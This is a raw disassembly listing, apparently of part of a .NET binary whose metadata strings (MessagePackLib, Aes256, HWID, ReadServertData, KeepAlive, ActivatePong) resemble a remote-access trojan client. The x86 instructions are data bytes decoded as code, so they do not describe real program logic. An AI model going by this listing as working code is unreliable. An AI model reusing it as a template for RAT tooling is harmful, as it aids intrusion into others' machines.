  407723:	1b 01                	sbb    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	ee                   	out    %al,(%dx)
  40772b:	05 02 00 41 01       	add    $0x1410002,%eax
  407730:	77 00                	ja     0x407732
  407732:	05 1b 02 00 40       	add    $0x4000021b,%eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	c2 08 02             	ret    $0x208
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	82 0e 03             	orb    $0x3,(%esi)
  407745:	00 50 20             	add    %dl,0x20(%eax)
  407748:	00 00                	add    %al,(%eax)
  40774a:	2d 00 70 20 00       	sub    $0x207000,%eax
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	c1 02 00             	roll   $0x0,(%edx)
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	b8 02 00 00 00       	mov    $0x2,%eax
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	f2 0f 00 00          	repnz sldt (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 d8                	add    %bl,%al
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	4a                   	dec    %edx
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 e4                	add    %ah,%ah
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 83 1a 00 00 00    	add    %al,0x1a(%ebx)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	aa                   	stos   %al,%es:(%edi)
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 99 12 00 00 00    	add    %bl,0x12(%ecx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	3c 4d                	cmp    $0x4d,%al
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	64 75 6c             	fs jne 0x4079ce
  407962:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407967:	73 73                	jae    0x4079dc
  407969:	61                   	popa
  40796a:	67 65 50             	addr16 gs push %eax
  40796d:	61                   	popa
  40796e:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407971:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407978:	76 61                	jbe    0x4079db
  40797a:	74 65                	je     0x4079e1
  40797c:	49                   	dec    %ecx
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	70 6c                	jo     0x4079ec
  407980:	65 6d                	gs insl (%dx),%es:(%edi)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	74 61                	je     0x4079e7
  407986:	74 69                	je     0x4079f1
  407988:	6f                   	outsl  %ds:(%esi),(%dx)
  407989:	6e                   	outsb  %ds:(%esi),(%dx)
  40798a:	44                   	inc    %esp
  40798b:	65 74 61             	gs je  0x4079ef
  40798e:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  407995:	42 
  407996:	32 41 31             	xor    0x31(%ecx),%al
  407999:	46                   	inc    %esi
  40799a:	39 39                	cmp    %edi,(%ecx)
  40799c:	30 32                	xor    %dh,(%edx)
  40799e:	42                   	inc    %edx
  40799f:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079a5:	38 30                	cmp    %dh,(%eax)
  4079a7:	45                   	inc    %ebp
  4079a8:	46                   	inc    %esi
  4079a9:	31 36                	xor    %esi,(%esi)
  4079ab:	39 32                	cmp    %esi,(%edx)
  4079ad:	43                   	inc    %ebx
  4079ae:	45                   	inc    %ebp
  4079af:	39 39                	cmp    %edi,(%ecx)
  4079b1:	34 37                	xor    $0x37,%al
  4079b3:	41                   	inc    %ecx
  4079b4:	31 39                	xor    %edi,(%ecx)
  4079b6:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079ba:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079bd:	44                   	inc    %esp
  4079be:	38 46 35             	cmp    %al,0x35(%esi)
  4079c1:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079c5:	41                   	inc    %ecx
  4079c6:	37                   	aaa
  4079c7:	32 31                	xor    (%ecx),%dh
  4079c9:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079cf:	43                   	inc    %ebx
  4079d0:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079d5:	43                   	inc    %ebx
  4079d6:	00 45 53             	add    %al,0x53(%ebp)
  4079d9:	5f                   	pop    %edi
  4079da:	53                   	push   %ebx
  4079db:	59                   	pop    %ecx
  4079dc:	53                   	push   %ebx
  4079dd:	54                   	push   %esp
  4079de:	45                   	inc    %ebp
  4079df:	4d                   	dec    %ebp
  4079e0:	5f                   	pop    %edi
  4079e1:	52                   	push   %edx
  4079e2:	45                   	inc    %ebp
  4079e3:	51                   	push   %ecx
  4079e4:	55                   	push   %ebp
  4079e5:	49                   	dec    %ecx
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	44                   	inc    %esp
  4079e9:	00 45 53             	add    %al,0x53(%ebp)
  4079ec:	5f                   	pop    %edi
  4079ed:	44                   	inc    %esp
  4079ee:	49                   	dec    %ecx
  4079ef:	53                   	push   %ebx
  4079f0:	50                   	push   %eax
  4079f1:	4c                   	dec    %esp
  4079f2:	41                   	inc    %ecx
  4079f3:	59                   	pop    %ecx
  4079f4:	5f                   	pop    %edi
  4079f5:	52                   	push   %edx
  4079f6:	45                   	inc    %ebp
  4079f7:	51                   	push   %ecx
  4079f8:	55                   	push   %ebp
  4079f9:	49                   	dec    %ecx
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	44                   	inc    %esp
  4079fd:	00 4d 61             	add    %cl,0x61(%ebp)
  407a00:	70 4e                	jo     0x407a50
  407a02:	61                   	popa
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	65 54                	gs push %esp
  407a06:	6f                   	outsl  %ds:(%esi),(%dx)
  407a07:	4f                   	dec    %edi
  407a08:	49                   	dec    %ecx
  407a09:	44                   	inc    %esp
  407a0a:	00 48 57             	add    %cl,0x57(%eax)
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 67 65             	add    %ah,0x65(%edi)
  407a12:	74 5f                	je     0x407a73
  407a14:	46                   	inc    %esi
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	72 6d                	jb     0x407a85
  407a18:	61                   	popa
  407a19:	74 49                	je     0x407a64
  407a1b:	44                   	inc    %esp
  407a1c:	00 45 58             	add    %al,0x58(%ebp)
  407a1f:	45                   	inc    %ebp
  407a20:	43                   	inc    %ebx
  407a21:	55                   	push   %ebp
  407a22:	54                   	push   %esp
  407a23:	49                   	dec    %ecx
  407a24:	4f                   	dec    %edi
  407a25:	4e                   	dec    %esi
  407a26:	5f                   	pop    %edi
  407a27:	53                   	push   %ebx
  407a28:	54                   	push   %esp
  407a29:	41                   	inc    %ecx
  407a2a:	54                   	push   %esp
  407a2b:	45                   	inc    %ebp
  407a2c:	00 38                	add    %bh,(%eax)
  407a2e:	37                   	aaa
  407a2f:	36 33 39             	xor    %ss:(%ecx),%edi
  407a32:	31 32                	xor    %esi,(%edx)
  407a34:	36 45                	ss inc %ebp
  407a36:	41                   	inc    %ecx
  407a37:	37                   	aaa
  407a38:	37                   	aaa
  407a39:	42                   	inc    %edx
  407a3a:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a40:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a45:	37                   	aaa
  407a46:	44                   	inc    %esp
  407a47:	42                   	inc    %edx
  407a48:	41                   	inc    %ecx
  407a49:	36 37                	ss aaa
  407a4b:	43                   	inc    %ebx
  407a4c:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a51:	46                   	inc    %esi
  407a52:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a57:	39 38                	cmp    %edi,(%eax)
  407a59:	38 38                	cmp    %bh,(%eax)
  407a5b:	45                   	inc    %ebp
  407a5c:	44                   	inc    %esp
  407a5d:	30 37                	xor    %dh,(%edi)
  407a5f:	30 43 44             	xor    %al,0x44(%ebx)
  407a62:	34 30                	xor    $0x30,%al
  407a64:	45                   	inc    %ebp
  407a65:	31 46 36             	xor    %eax,0x36(%esi)
  407a68:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a6e:	67 65 74 5f          	addr16 gs je 0x407ad1
  407a72:	41                   	inc    %ecx
  407a73:	53                   	push   %ebx
  407a74:	43                   	inc    %ebx
  407a75:	49                   	dec    %ecx
  407a76:	49                   	dec    %ecx
  407a77:	00 53 79             	add    %dl,0x79(%ebx)
  407a7a:	73 74                	jae    0x407af0
  407a7c:	65 6d                	gs insl (%dx),%es:(%edi)
  407a7e:	2e 49                	cs dec %ecx
  407a80:	4f                   	dec    %edi
  407a81:	00 49 73             	add    %cl,0x73(%ecx)
  407a84:	58                   	pop    %eax
  407a85:	50                   	push   %eax
  407a86:	00 42 44             	add    %al,0x44(%edx)
  407a89:	4f                   	dec    %edi
  407a8a:	53                   	push   %ebx
  407a8b:	00 45 53             	add    %al,0x53(%ebp)
  407a8e:	5f                   	pop    %edi
  407a8f:	43                   	inc    %ebx
  407a90:	4f                   	dec    %edi
  407a91:	4e                   	dec    %esi
  407a92:	54                   	push   %esp
  407a93:	49                   	dec    %ecx
  407a94:	4e                   	dec    %esi
  407a95:	55                   	push   %ebp
  407a96:	4f                   	dec    %edi
  407a97:	55                   	push   %ebp
  407a98:	53                   	push   %ebx
  407a99:	00 67 65             	add    %ah,0x65(%edi)
  407a9c:	74 5f                	je     0x407afd
  407a9e:	49                   	dec    %ecx
  407a9f:	56                   	push   %esi
  407aa0:	00 73 65             	add    %dh,0x65(%ebx)
  407aa3:	74 5f                	je     0x407b04
  407aa5:	49                   	dec    %ecx
  407aa6:	56                   	push   %esi
  407aa7:	00 47 65             	add    %al,0x65(%edi)
  407aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407aab:	65 72 61             	gs jb  0x407b0f
  407aae:	74 65                	je     0x407b15
  407ab0:	49                   	dec    %ecx
  407ab1:	56                   	push   %esi
  407ab2:	00 4d 54             	add    %cl,0x54(%ebp)
  407ab5:	58                   	pop    %eax
  407ab6:	00 76 61             	add    %dh,0x61(%esi)
  407ab9:	6c                   	insb   (%dx),%es:(%edi)
  407aba:	75 65                	jne    0x407b21
  407abc:	5f                   	pop    %edi
  407abd:	5f                   	pop    %edi
  407abe:	00 52 65             	add    %dl,0x65(%edx)
  407ac1:	61                   	popa
  407ac2:	64 53                	fs push %ebx
  407ac4:	65 72 76             	gs jb  0x407b3d
  407ac7:	65 72 74             	gs jb  0x407b3e
  407aca:	44                   	inc    %esp
  407acb:	61                   	popa
  407acc:	74 61                	je     0x407b2f
  407ace:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ad2:	61                   	popa
  407ad3:	00 6d 73             	add    %ch,0x73(%ebp)
  407ad6:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ad9:	6c                   	insb   (%dx),%es:(%edi)
  407ada:	69 62 00 37 38 39 63 	imul   $0x63393837,0x0(%edx),%esp
  407ae1:	6c                   	insb   (%dx),%es:(%edi)
  407ae2:	75 62                	jne    0x407b46
  407ae4:	00 53 79             	add    %dl,0x79(%ebx)
  407ae7:	73 74                	jae    0x407b5d
  407ae9:	65 6d                	gs insl (%dx),%es:(%edi)
  407aeb:	2e 43                	cs inc %ebx
  407aed:	6f                   	outsl  %ds:(%esi),(%dx)
  407aee:	6c                   	insb   (%dx),%es:(%edi)
  407aef:	6c                   	insb   (%dx),%es:(%edi)
  407af0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af5:	6e                   	outsb  %ds:(%esi),(%dx)
  407af6:	73 2e                	jae    0x407b26
  407af8:	47                   	inc    %edi
  407af9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407afb:	65 72 69             	gs jb  0x407b67
  407afe:	63 00                	arpl   %eax,(%eax)
  407b00:	4d                   	dec    %ebp
  407b01:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b08:	74 2e                	je     0x407b38
  407b0a:	56                   	push   %esi
  407b0b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b12:	73 69                	jae    0x407b7d
  407b14:	63 00                	arpl   %eax,(%eax)
  407b16:	67 65 74 5f          	addr16 gs je 0x407b79
  407b1a:	53                   	push   %ebx
  407b1b:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1d:	64 53                	fs push %ebx
  407b1f:	79 6e                	jns    0x407b8f
  407b21:	63 00                	arpl   %eax,(%eax)
  407b23:	45                   	inc    %ebp
  407b24:	6e                   	outsb  %ds:(%esi),(%dx)
  407b25:	64 52                	fs push %edx
  407b27:	65 61                	gs popa
  407b29:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2d:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b34:	00 
  407b35:	54                   	push   %esp
  407b36:	68 72 65 61 64       	push   $0x64616572
  407b3b:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b3f:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b43:	6e                   	outsb  %ds:(%esi),(%dx)
  407b44:	65 72 41             	gs jb  0x407b88
  407b47:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b4c:	41                   	inc    %ecx
  407b4d:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b53:	61                   	popa
  407b54:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b5a:	74 5f                	je     0x407bbb
  407b5c:	43                   	inc    %ebx
  407b5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b60:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b65:	00 67 65             	add    %ah,0x65(%edi)
  407b68:	74 5f                	je     0x407bc9
  407b6a:	49                   	dec    %ecx
  407b6b:	73 43                	jae    0x407bb0
  407b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b75:	00 73 65             	add    %dh,0x65(%ebx)
  407b78:	74 5f                	je     0x407bd9
  407b7a:	49                   	dec    %ecx
  407b7b:	73 43                	jae    0x407bc0
  407b7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b80:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b85:	00 52 65             	add    %dl,0x65(%edx)
  407b88:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b8b:	76 65                	jbe    0x407bf2
  407b8d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b91:	74 5f                	je     0x407bf2
  407b93:	47                   	inc    %edi
  407b94:	75 69                	jne    0x407bff
  407b96:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b9a:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba1:	64 
  407ba2:	53                   	push   %ebx
  407ba3:	79 6e                	jns    0x407c13
  407ba5:	63 3e                	arpl   %edi,(%esi)
  407ba7:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bab:	61                   	popa
  407bac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407baf:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb0:	67 46                	addr16 inc %esi
  407bb2:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb9:	73 43                	jae    0x407bfe
  407bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbc:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbe:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc3:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc8:	61                   	popa
  407bc9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcd:	67 46                	addr16 inc %esi
  407bcf:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd6:	65 65 70 41          	gs gs jo 0x407c1b
  407bda:	6c                   	insb   (%dx),%es:(%edi)
  407bdb:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be2:	42                   	inc    %edx
  407be3:	61                   	popa
  407be4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be7:	6e                   	outsb  %ds:(%esi),(%dx)
  407be8:	67 46                	addr16 inc %esi
  407bea:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf1:	65 61                	gs popa
  407bf3:	64 65 72 53          	fs gs jb 0x407c4a
  407bf7:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bfe:	42                   	inc    %edx
  407bff:	61                   	popa
  407c00:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c03:	6e                   	outsb  %ds:(%esi),(%dx)
  407c04:	67 46                	addr16 inc %esi
  407c06:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0d:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c14:	42                   	inc    %edx
  407c15:	61                   	popa
  407c16:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c19:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1a:	67 46                	addr16 inc %esi
  407c1c:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c23:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c27:	61                   	popa
  407c28:	74 65                	je     0x407c8f
  407c2a:	50                   	push   %eax
  407c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2d:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c33:	61                   	popa
  407c34:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c37:	6e                   	outsb  %ds:(%esi),(%dx)
  407c38:	67 46                	addr16 inc %esi
  407c3a:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c41:	6e                   	outsb  %ds:(%esi),(%dx)
  407c42:	74 65                	je     0x407ca9
  407c44:	72 76                	jb     0x407cbc
  407c46:	61                   	popa
  407c47:	6c                   	insb   (%dx),%es:(%edi)
  407c48:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4d:	61                   	popa
  407c4e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c51:	6e                   	outsb  %ds:(%esi),(%dx)
  407c52:	67 46                	addr16 inc %esi
  407c54:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c5b:	75 66                	jne    0x407cc3
  407c5d:	66 65 72 3e          	data16 gs jb 0x407c9f
  407c61:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c65:	61                   	popa
  407c66:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c69:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6a:	67 46                	addr16 inc %esi
  407c6c:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c73:	66 66 73 65          	data16 data16 jae 0x407cdc
  407c77:	74 3e                	je     0x407cb7
  407c79:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7d:	61                   	popa
  407c7e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c81:	6e                   	outsb  %ds:(%esi),(%dx)
  407c82:	67 46                	addr16 inc %esi
